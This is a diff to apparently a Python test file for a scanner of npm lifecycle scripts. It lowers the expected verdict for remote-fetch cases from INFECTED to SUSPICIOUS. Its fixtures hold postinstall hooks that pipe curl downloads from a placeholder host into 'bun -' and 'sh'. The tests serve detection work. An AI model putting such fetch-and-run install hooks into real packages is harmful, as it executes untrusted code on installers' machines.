@@ -31,10 +31,10 @@ class TestNpmLifecycle(unittest.TestCase):
         self.assertIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})
         self.assertEqual(r.verdict, INFECTED)
 
-    def test_remote_fetch_piped_into_bun_is_confirmed(self):
+    def test_remote_fetch_piped_into_bun_is_for_you_to_check(self):
         r = _scan_pkg({"postinstall": "curl -s https://x.invalid/y | bun -"})
         self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
-        self.assertEqual(r.verdict, INFECTED)
+        self.assertEqual(r.verdict, SUSPICIOUS)
 
     def test_bun_smuggling_is_heuristic_suspicious(self):
         r = _scan_pkg({"install": "bunx some-tool"})
@@ -68,7 +68,7 @@ class TestNpmLifecycle(unittest.TestCase):
         # every security regex, in test_redos_safety.py — not re-duplicated per matcher.)
         r = _scan_pkg({"postinstall": "echo setup && curl -fsSL https://x.invalid/i.sh | sh"})
         self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
-        self.assertEqual(r.verdict, INFECTED)
+        self.assertEqual(r.verdict, SUSPICIOUS)
 
 
 
